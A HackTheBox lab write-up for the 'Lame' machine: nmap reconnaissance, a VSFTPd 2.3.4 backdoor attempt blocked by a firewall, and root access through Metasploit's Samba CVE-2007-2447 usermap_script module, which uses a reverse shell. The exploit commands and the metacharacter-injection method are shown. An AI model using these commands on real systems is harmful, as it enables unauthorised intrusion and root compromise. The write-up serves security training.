# Lame

**Platform:** HackTheBox  
**OS:** Linux  
**Difficulty:** Easy  
**Date:** April 2026

---

## Summary

Linux machine running VSFTPd 2.3.4 and Samba 3.0.20. The VSFTPd 
backdoor exploit appears to work but leads to a rabbit hole with 
no session created. The real attack vector is Samba 3.0.20 
vulnerable to CVE-2007-2447, allowing RCE via shell metacharacters 
in the username field. Exploitation grants direct root access.

---

## 1. Reconnaissance

Port scan using nmap:

```bash
nmap -Pn --top-ports 1000 -T3 10.10.10.3
```

**Open ports:**

| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | VSFTPd 2.3.4 |
| 22 | SSH | OpenSSH |
| 139 | NetBIOS | Samba |
| 445 | SMB | Samba 3.0.20 |

---

## 2. VSFTPd 2.3.4 Backdoor (Rabbit Hole)

Attempted exploitation of the famous VSFTPd 2.3.4 backdoor:

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 10.10.10.3
exploit
```

Result: **Exploit completed but no session created.**

The backdoor triggers port 6200 to open but a firewall blocks 
the connection. This is a rabbit hole — moving on to Samba.

---

## 3. Samba CVE-2007-2447

Samba 3.0.20 is vulnerable to CVE-2007-2447, which allows RCE 
via shell metacharacters in the username field when the 
"username map script" option is enabled in smb.conf.

Exploited using Metasploit:

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOST 10.10.10.3
set LHOST tun0
exploit
```

Received shell as **root** directly.

---

## 4. Flags

Retrieved both flags:

```bash
whoami
# root

cat /root/root.txt
cat /home/makis/user.txt
```

- user.txt ✅
- root.txt ✅

---

## 5. Notes

The firewall on the machine blocks connections to many ports 
that appear open internally via netstat. This is why the VSFTPd 
backdoor fails despite port 6200 opening on the target.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port and service enumeration |
| Metasploit | Exploitation |

---

## Vulnerabilities Found

| Vulnerability | Description |
|--------------|-------------|
| VSFTPd 2.3.4 Backdoor | Blocked by firewall — rabbit hole |
| CVE-2007-2447 | Samba username map script RCE |
